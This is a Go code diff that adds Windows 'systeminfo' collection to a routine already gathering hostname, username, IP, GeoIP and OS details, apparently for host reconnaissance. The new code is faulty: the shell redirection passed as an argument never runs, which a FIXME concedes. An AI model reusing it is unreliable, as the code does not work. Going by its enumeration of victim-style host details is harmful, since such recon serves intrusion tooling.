@@ -37,6 +37,9 @@ import (
     "os/exec"
     "bytes"
     "fmt"
+    "crypto/rand"
+    "encoding/hex"
+    "io/ioutil"
 )
 
 type SystemInfo struct {
@@ -44,18 +47,21 @@ type SystemInfo struct {
      * Interface MAC/IP addresses, GeoIP Location in a juicy serialized structure,
      *  and global IP address as reported by "ipinfo.io"
      */
-    GlobalIP    *GeoIP
-    LocalIP     string
+    GlobalIP                *GeoIP
+    LocalIP                 string
 
     /* Operating system version/build */
-    OSName      string
+    OSName                  string
 
     /* Local host information -- should be universal */
-    Hostname    string
-    Username    string
+    Hostname                string
+    Username                string
 
     /* GoInfoObject -- kernel and detailed system info */
-    GoInfo      *goInfo.GoInfoObject
+    GoInfo                  *goInfo.GoInfoObject
+
+    /* Windows specific output of "systeminfo" command */
+    SystemInfoCommand       *string
 }
 
 func GetSystemInfo() (sysinfo *SystemInfo, err error) {
@@ -135,6 +141,36 @@ func GetSystemInfo() (sysinfo *SystemInfo, err error) {
             gio := &goInfo.GoInfoObject{Kernel:"windows",Core:ver,Platform:"unknown",OS:"windows",GoOS:runtime.GOOS,CPUs:runtime.NumCPU()}
             gio.Hostname,_ = os.Hostname()
             return gio
+        } ()
+
+        report.SystemInfoCommand = func () *string {
+            var output = "['systeminfo' output]:\n\n"
+
+            r := make([]byte, 8)
+            rand.Read(r)
+            output_filename := os.Getenv("TEMP") + "\\_" + hex.EncodeToString(r) + ".txt"
+
+            cmd := exec.Command("systeminfo", " > " + output_filename)
+
+            err := cmd.Start()
+            SleepSeconds(10)
+
+            if err != nil {
+                output += "<command failed>"
+            } else {
+                if _, err := os.Stat(output_filename); !os.IsNotExist(err) {
+                    raw_file, err := ioutil.ReadFile(output_filename)
+                    if err != nil {
+                        output += "<error: Report file not found>"
+                    }
+                    output += string(raw_file)
+                } else {
+                    /* FIXME -- The command does not start, nor generate the file */
+                    output += "<error: Report file not found>"
+                }
+            }
+
+            return &output
         } ()
     case "linux":
         report.GoInfo = func () *goInfo.GoInfoObject {
